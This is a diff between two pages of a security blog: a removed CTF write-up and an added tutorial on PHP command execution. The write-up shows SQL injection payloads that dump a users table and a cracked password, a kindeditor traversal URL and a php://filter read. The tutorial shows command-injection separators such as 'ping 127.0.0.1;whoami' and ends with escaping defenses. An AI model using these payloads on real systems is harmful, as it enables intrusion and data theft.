@@ -5,23 +5,20 @@
   
 
   
-  <title>i春秋-Web-BLOG | Jaylin&#39;s Blog</title>
+  <title>PHP中的命令执行 | Jaylin&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="一个BLOG，注册后登录，发现使用了 kindeditor 4.1.10 编辑器，这个编辑器存在目录遍历漏洞，访问 /kindeditor/php/file_manager_json.php?path=../，会泄露目录内文件。  发现 flag 就在网站根目录下，但是没办法访问到。 继续摸索，有个发文章的功能，存在SQL注入，INSERT型。 通过INSERT可以批量添加记录的特性，判断出当前表">
-<meta name="keywords" content="Web,i春秋,BLOG">
+  <meta name="description" content="介绍在 PHP 中, exec()、system()、popen()、passthru()、proc_open()、pcntl_exec()、shell_exec()，还有反引号 ``包裹的内容，都可以用来执行系统命令。 如果执行的命令参数是用户可控的，那么就会造成命令执行漏洞。 下面是常见的函数描述：  system()   输出并返回最后一行shell结果。   exec()   不输出结果，">
+<meta name="keywords" content="Web,Php">
 <meta property="og:type" content="article">
-<meta property="og:title" content="i春秋-Web-BLOG">
-<meta property="og:url" content="http://Jayl1n.github.io/2018/09/11/ichunqiu-web-BLOG/index.html">
+<meta property="og:title" content="PHP中的命令执行">
+<meta property="og:url" content="http://Jayl1n.github.io/2018/09/18/summary-command-execution/index.html">
 <meta property="og:site_name" content="Jaylin&#39;s Blog">
-<meta property="og:description" content="一个BLOG，注册后登录，发现使用了 kindeditor 4.1.10 编辑器，这个编辑器存在目录遍历漏洞，访问 /kindeditor/php/file_manager_json.php?path=../，会泄露目录内文件。  发现 flag 就在网站根目录下，但是没办法访问到。 继续摸索，有个发文章的功能，存在SQL注入，INSERT型。 通过INSERT可以批量添加记录的特性，判断出当前表">
+<meta property="og:description" content="介绍在 PHP 中, exec()、system()、popen()、passthru()、proc_open()、pcntl_exec()、shell_exec()，还有反引号 ``包裹的内容，都可以用来执行系统命令。 如果执行的命令参数是用户可控的，那么就会造成命令执行漏洞。 下面是常见的函数描述：  system()   输出并返回最后一行shell结果。   exec()   不输出结果，">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://jayl1n.github.io/2018/09/11/ichunqiu-web-BLOG/kindeditor.png">
-<meta property="og:image" content="http://jayl1n.github.io/2018/09/11/ichunqiu-web-BLOG/flag.png">
-<meta property="og:updated_time" content="2018-09-11T12:51:28.623Z">
+<meta property="og:updated_time" content="2018-09-18T12:47:41.765Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="i春秋-Web-BLOG">
-<meta name="twitter:description" content="一个BLOG，注册后登录，发现使用了 kindeditor 4.1.10 编辑器，这个编辑器存在目录遍历漏洞，访问 /kindeditor/php/file_manager_json.php?path=../，会泄露目录内文件。  发现 flag 就在网站根目录下，但是没办法访问到。 继续摸索，有个发文章的功能，存在SQL注入，INSERT型。 通过INSERT可以批量添加记录的特性，判断出当前表">
-<meta name="twitter:image" content="http://jayl1n.github.io/2018/09/11/ichunqiu-web-BLOG/kindeditor.png">
+<meta name="twitter:title" content="PHP中的命令执行">
+<meta name="twitter:description" content="介绍在 PHP 中, exec()、system()、popen()、passthru()、proc_open()、pcntl_exec()、shell_exec()，还有反引号 ``包裹的内容，都可以用来执行系统命令。 如果执行的命令参数是用户可控的，那么就会造成命令执行漏洞。 下面是常见的函数描述：  system()   输出并返回最后一行shell结果。   exec()   不输出结果，">
   
     <link rel="alternate" href="/atom.xml" title="Jaylin&#39;s Blog" type="application/atom+xml">
   
@@ -68,10 +65,10 @@
   </div>
 </header>
       <div class="outer">
-        <section id="main"><article id="post-ichunqiu-web-BLOG" class="article article-type-post" itemscope itemprop="blogPost">
+        <section id="main"><article id="post-summary-command-execution" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2018/09/11/ichunqiu-web-BLOG/" class="article-date">
-  <time datetime="2018-09-11T09:37:52.000Z" itemprop="datePublished">2018-09-11</time>
+    <a href="/2018/09/18/summary-command-execution/" class="article-date">
+  <time datetime="2018-09-18T11:44:31.000Z" itemprop="datePublished">2018-09-18</time>
 </a>
     
   </div>
@@ -82,7 +79,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      i春秋-Web-BLOG
+      PHP中的命令执行
     </h1>
   
 
@@ -90,51 +87,109 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>一个BLOG，注册后登录，发现使用了 <code>kindeditor 4.1.10</code> 编辑器，这个编辑器存在目录遍历漏洞，访问 <code>/kindeditor/php/file_manager_json.php?path=../</code>，会泄露目录内文件。</p>
-<p><img src="/2018/09/11/ichunqiu-web-BLOG/kindeditor.png" alt="kindeditor"></p>
-<p>发现 <code>flag</code> 就在网站根目录下，但是没办法访问到。</p>
-<p>继续摸索，有个发文章的功能，存在SQL注入，INSERT型。</p>
-<p>通过INSERT可以批量添加记录的特性，判断出当前表存在4个字段。</p>
-<p>Payload:</p>
-<blockquote>
-<p>title=1&amp;content=1’,’1’),(‘aaa’,’bbb’,’ccc’) # 报错<br>title=1&amp;content=1’,’1’),(‘aaa’,’bbb’,’ccc’,’ddd’) # 成功</p>
-</blockquote>
-<p>根据回显，得出第二个字段是标题，第三个字段是内容。</p>
-<p>开始爆数据：</p>
+        <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>在 PHP 中, <code>exec()</code>、<code>system()</code>、<code>popen()</code>、<code>passthru()</code>、<code>proc_open()</code>、<code>pcntl_exec()</code>、<code>shell_exec()</code>，还有反引号 ``包裹的内容，都可以用来执行系统命令。</p>
+<p>如果执行的命令参数是用户可控的，那么就会造成命令执行漏洞。</p>
+<p>下面是常见的函数描述：</p>
 <ul>
-<li><p>爆表名</p>
+<li><p>system()</p>
+<p>  输出并返回最后一行shell结果。 </p>
+</li>
+<li><p>exec()</p>
+<p>  不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面。</p>
+</li>
+<li><p>passthru()</p>
+<p>  只调用命令，把命令的运行结果原样地直接输出到标准输出设备上。</p>
+</li>
+<li><p>popen()、proc_open()</p>
+<p>  不会直接返回执行结果，而是返回一个文件指针。</p>
+</li>
+<li><p>反引号</p>
+<p>  调用 <code>shell_exec()</code> 函数</p>
+</li>
+</ul>
+<hr>
+<h2 id="各平台的漏洞利用"><a href="#各平台的漏洞利用" class="headerlink" title="各平台的漏洞利用"></a>各平台的漏洞利用</h2><p>在实际场景中，要利用命令执行漏洞，通常需要借助管道符，拼接到正常的命令参数中来实现。</p>
+<p>各个平台支持的管道符都有所不同，下面是 <code>Windows</code> 及 <code>Linux</code> 支持的管道符。</p>
+<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><ul>
+<li><p>|</p>
+<p>  直接执行后面的语句。</p>
 <blockquote>
-<p>title=1&amp;content=1’,’1’),(‘aaa’,(select group_concat(table_name) from information_schema.tables where table_schema = database()),’ccc’,’ddd’) # 得到表 [posts,users]</p>
+<p>ping | whoami</p>
 </blockquote>
 </li>
-<li><p>爆字段</p>
+<li><p>||</p>
+<p>  如果前面的语句执行出错，则执行后面的语句。</p>
 <blockquote>
-<p>title=1&amp;content=1’,’1’),(‘aaa’,(select table_name, column_name from information_schema.columns where table_name = ‘users’ # 得到两个字段 [username,password]</p>
+<p>p || whoami</p>
 </blockquote>
 </li>
-<li><p>爆用户</p>
+<li><p>\&amp;</p>
+<p>  如果前面的语句为假，直接执行后面的语句。</p>
+<p>  为真，也会执行后面的语句。</p>
 <blockquote>
-<p>title=1&amp;content=1’,’1’),(‘aaa’,(select group_concat(username) from users ),’ccc’,’ddd’) # 得到用户名 admin </p>
+<p>ping 127.0.0.1 &amp; whoami</p>
 </blockquote>
 </li>
-<li><p>爆密码</p>
+<li><p>\&amp;\&amp;</p>
+<p>  如果前面的语句为假直接出错，不会执行后面的。前面的语句必须为真。</p>
 <blockquote>
-<p>title=1&amp;content=1’,’1’),(‘aaa’,(select group_concat(password) from users ),’ccc’,’ddd’) # 得到密码HASH dbb616c5d935d8f34c12c291066d6fb7，解密后 melody123</p>
+<p>ping 127.0.0.1 &amp;&amp; whoami</p>
 </blockquote>
 </li>
 </ul>
-<p>重新以 <code>admin</code> 身份登录，发现新的入口 <code>/blog_manage/manager.php?module=article_manage&amp;name=php</code>，看链接，长得就像文件包含漏洞。</p>
-<p>测试后，发现确实是这个问题。</p>
-<p>构造链接， <code>/blog_manage/manager.php?module=php://filter/read=convert.base64-encode/resource=../flag&amp;name=php</code>，成功读到 <code>flag</code>。</p>
-<p><img src="/2018/09/11/ichunqiu-web-BLOG/flag.png" alt="flag"></p>
+<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><ul>
+<li><p>\;</p>
+<p>  执行完前面的语句，再执行后面的。</p>
+<blockquote>
+<p>ping 127.0.0.1;whoami</p>
+</blockquote>
+</li>
+<li><p>|</p>
+<p>  直接执行后面的语句。</p>
+<blockquote>
+<p>ping | whoami</p>
+</blockquote>
+</li>
+<li><p>||</p>
+<p>  如果前面的语句执行出错，则执行后面的语句。</p>
+<blockquote>
+<p>p || whoami</p>
+</blockquote>
+</li>
+<li><p>\&amp;</p>
+<p>  如果前面的语句为假，直接执行后面的语句。</p>
+<p>  为真，也会执行后面的语句。</p>
+<blockquote>
+<p>ping 127.0.0.1 &amp; whoami</p>
+</blockquote>
+</li>
+<li><p>\&amp;\&amp;</p>
+<p>  如果前面的语句为假直接出错，不会执行后面的。前面的语句必须为真。</p>
+<blockquote>
+<p>ping 127.0.0.1 &amp;&amp; whoami</p>
+</blockquote>
+</li>
+</ul>
+<hr>
+<h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><p>PHP 内置了两个函数，<code>escapeshellarg()</code>，<code>escapeshellcmd()</code>可以防止命令执行。</p>
+<ol>
+<li><p>escapeshellarg()</p>
+<p> 把字符串转码为可以在 shell 命令里使用的参数。</p>
+</li>
+<li><p>escapeshellcmd()</p>
+<p> shell 元字符转义。</p>
+<p> 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 <code>exec()</code> 或 <code>system()</code> 函数，或者 执行操作符 之前进行转义。</p>
+<p> 反斜线（\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]{}$\, \x0A 和 \xFF。 ‘ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。 </p>
+</li>
+</ol>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://Jayl1n.github.io/2018/09/11/ichunqiu-web-BLOG/" data-id="cjm7r8scz00263ovnmg8uz7mf" class="article-share-link">Share</a>
+      <a data-url="http://Jayl1n.github.io/2018/09/18/summary-command-execution/" data-id="cjm7r8se1002m3ovnwxywj2gq" class="article-share-link">Share</a>
       
       
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/BLOG/">BLOG</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/i春秋/">i春秋</a></li></ul>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Php/">Php</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
 
     </footer>
   </div>
@@ -142,19 +197,10 @@
     
 <nav id="article-nav">
   
-    <a href="/2018/09/12/ichunqiu-web-time/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          i春秋-Web-时间
-        
-      </div>
-    </a>
   
-  
-    <a href="/2018/09/11/ichunqiu-web-Upload/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2018/09/18/summary-fileupload-bypass/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">ichunqiu-web-Upload</div>
+      <div class="article-nav-title">文件上传绕过的各种姿势</div>
     </a>
   
 </nav>
